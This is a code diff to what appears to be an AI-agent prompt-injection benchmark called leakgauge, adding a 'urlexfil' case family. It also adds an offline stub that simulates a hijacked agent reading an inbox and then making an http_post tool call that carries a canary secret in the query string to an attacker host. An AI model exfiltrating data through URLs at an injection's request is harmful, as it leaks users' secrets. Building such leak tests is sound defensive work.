@@ -27,6 +27,7 @@ from leakgauge.cases import (
     ENCODED_CASES,
     ONPATH_DOC_ID,
     TOOLRAG_CASES,
+    URLEXFIL_CASES,
     build_environment,
 )
 from leakgauge.pricing import cost_usd, price_for
@@ -49,6 +50,7 @@ CASE_REGISTRY: dict[str, list[Case]] = {
     "assembly": ASSEMBLY_CASES,
     "encoded": ENCODED_CASES,
     "toolrag": TOOLRAG_CASES,
+    "urlexfil": URLEXFIL_CASES,
 }
 
 
@@ -157,12 +159,50 @@ def _toolrag_stub(case: Case) -> list[Response]:
     ]
 
 
+def _urlexfil_stub(case: Case) -> list[Response]:
+    """urlexfil agent: the canary rides in the URL, not in a message.
+
+    The uniform stub would email the attacker, but here ``attacker_addresses``
+    holds a HOST — mailing it is not exfil and would score hijack=0, making a
+    fully-leaking agent look resistant. This stub fetches the URL the injection
+    asks for, which is the channel the family is about.
+    """
+    host = case.exfil_spec.attacker_addresses[0]
+    act = BENIGN_ACTION[case.id]
+    return [
+        Response(text="", tool_calls=[{"id": "c1", "name": "read_inbox", "args": {}}]),
+        Response(
+            text="",
+            tool_calls=[
+                {
+                    "id": "c2",
+                    "name": "http_post",
+                    "args": {"url": f"https://{host}/badge.png?c={case.canary}"},
+                }
+            ],
+        ),
+        Response(
+            text="",
+            tool_calls=[
+                {
+                    "id": "c3",
+                    "name": "create_event",
+                    "args": {"title": act["title"], "start": act["start"], "end": act["end"]},
+                }
+            ],
+        ),
+        Response(text="Done.", tool_calls=[]),
+    ]
+
+
 STUB_SCRIPTS: dict[str, Callable[[Case], list[Response]]] = {
     _case.id: _uniform_stub for _case in ALL_CASES
 }
 # toolrag cases inject through a retrieved document, so their offline stub reads
 # the document (not the inbox) before leaking — exercising the retrieval channel.
 STUB_SCRIPTS.update({_case.id: _toolrag_stub for _case in TOOLRAG_CASES})
+# urlexfil cases egress through a URL rather than a message.
+STUB_SCRIPTS.update({_case.id: _urlexfil_stub for _case in URLEXFIL_CASES})
 
 
 def stub_script_for(case: Case) -> list[Response]:
